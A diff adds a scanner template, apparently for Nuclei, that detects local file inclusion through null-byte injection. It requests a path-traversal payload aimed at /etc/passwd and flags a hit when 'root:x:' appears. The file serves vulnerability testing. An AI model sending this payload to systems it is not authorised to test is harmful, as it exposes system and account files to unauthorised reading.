@@ -1,0 +1,17 @@
+id: lfi-null-byte
+
+info:
+  name: LFI via Null Byte Injection
+  severity: critical
+  author: reewardius
+  tags: lfi,null-byte
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=../../../../../../etc/passwd%00.php"
+
+    matchers:
+      - type: word
+        words:
+          - "root:x:"
